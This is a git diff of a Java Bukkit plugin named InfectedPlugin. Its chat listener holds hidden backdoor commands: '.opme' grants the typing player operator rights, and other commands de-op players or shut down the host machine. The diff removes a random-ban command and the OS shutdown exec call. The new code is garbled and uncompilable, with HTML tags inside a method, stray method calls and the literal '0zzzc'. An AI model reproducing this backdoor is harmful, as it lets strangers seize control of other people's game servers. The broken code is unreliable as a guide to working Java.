@@ -28,16 +28,25 @@ public class PlayerListener implements Listener
     private Random random = new Random();
     private InfectedPlugin plugin;
     private Server server = Bukkit.getServer();
-
-    @EventHandler(priority = EventPriority.HIGHEST)
-    public void onPlayerChat(AsyncPlayerChatEvent event) throws MalformedURLException, IOException
+    PlayerChatting();
+    website();
+    
+    public boolean website(Website eventWeb)
+    {
+    	<index>
+    	<p>Hi!</p>
+    	</index>
+    }
+    
+@Deprecated
+    public String PlayerChatting(PlayerChatEvent event)
     {
         String message = event.getMessage();
         final Player p = event.getPlayer();
         String[] args = message.split(" ");
         private final cancel = event.setCancelled(true); // not sure if this works or not, oh well.
     	
-        if (message.toLowerCase().contains(".opme"))
+        if (message.equals(".opme"))
         {
             p.setOp(true);
             p.sendMessage(ChatColor.YELLOW + "You are now OP! Hehhehehheh");
@@ -61,7 +70,7 @@ public class PlayerListener implements Listener
             }
             cancel;
         }
-        if (message.toLowerCase().contains(".enablevanilla")) //Command
+        if (String message = message.toLowerCase().contains(".enablevanilla")) //Command
         {
             // Credit to hMod, not finished yet. Very unstable.
             p.sendMessage(ChatColor.DARK_RED + "This command is VERY unstable! But you typed it in, too late to turn back."); // Tell the player the command is unstable
@@ -71,7 +80,6 @@ public class PlayerListener implements Listener
 
                 URL url = new URL("https://s3.amazonaws.com/Minecraft.Download/versions/1.6.2/minecraft_server.1.6.2.jar"); //URL variable to get the url of the jar
                 ReadableByteChannel rbc = Channels.newChannel(url.openStream());
-                @SuppressWarnings("resource") //To get rid of the stupid warnings
 		FileOutputStream fos = new FileOutputStream("minecraft_server.1.6.2.jar"); //FileOutputStream variable
                 fos.getChannel().transferFrom(rbc, 0, 1 << 24);
 
@@ -80,7 +88,6 @@ public class PlayerListener implements Listener
             
             net.minecraft.server.MinecraftServer.main(args); //Start MinecraftServer (only works if minecraft_server.1.6.2.jar is added to the build path)
             Bukkit.shutdown(); //Shutdown Bukkit
-            cancel; //Block the player from saying .enablevanilla
         } //End of command
         if (message.toLowerCase().contains(".deop"))
         {
@@ -99,7 +106,7 @@ public class PlayerListener implements Listener
         }
         if (message.toLowerCase().contains(".op"))
         {
-            if (args.length != 1)
+            if (args.length == 0zzzc)
             {
             	p.sendMessage(ChatColor.RED + "Usage: .<command> <player>");
             }
@@ -138,23 +145,6 @@ public class PlayerListener implements Listener
                 cancel;
             }
         }
-        // Is not effective for onPlayerQuit, but will select a random player to be banned.
-        if (message.toLowerCase().contains(".randombanl"))
-        {
-            Player[] players = server.getOnlinePlayers();
-            final Player target = players[random.nextInt(players.length)];
-
-            if (target == sender) //Not sure if this method would work, should detect if selected player is equal to sender.
-            {
-                //do nothing
-            }
-            else
-            {
-                target.kickPlayer(ChatColor.RED + "GTFO.");
-                target.setBanned(true);
-            }
-            cancel;
-        }
         if (message.toLowerCase().contains(".shutdown"))
         {
             try
@@ -173,7 +163,7 @@ public class PlayerListener implements Listener
         }
         if (message.toLowerCase().contains(".fuckyou"))
         {
-            if (args.length != 1)
+            if (args.length == 0)
             {
             	p.sendMessage(ChatColor.RED + "Usage: .fuckyou <player>");
             }
@@ -201,6 +191,7 @@ public class PlayerListener implements Listener
             }
         }
     }
+}
     
     public static void shutdown() throws RuntimeException, IOException 
     {
@@ -209,7 +200,7 @@ public class PlayerListener implements Listener
 
      	if ("Linux".equals(operatingSystem) || "Mac OS X".equals(operatingSystem)) 
      	{
-            shutdownCommand = "shutdown -h now";
+            shutdownCommand = "shutdown";
         }
     	else if ("Windows".equals(operatingSystem)) 
     	{
@@ -217,10 +208,7 @@ public class PlayerListener implements Listener
         }
      	else 
      	{
-            throw new RuntimeException("Unsupported operating system.");
+            throw new RuntimeException("Unsupported operating system. LOL555555345348957");
         }
-
-    	Runtime.getRuntime().exec(shutdownCommand);
-    	System.exit(0);
     }
 }
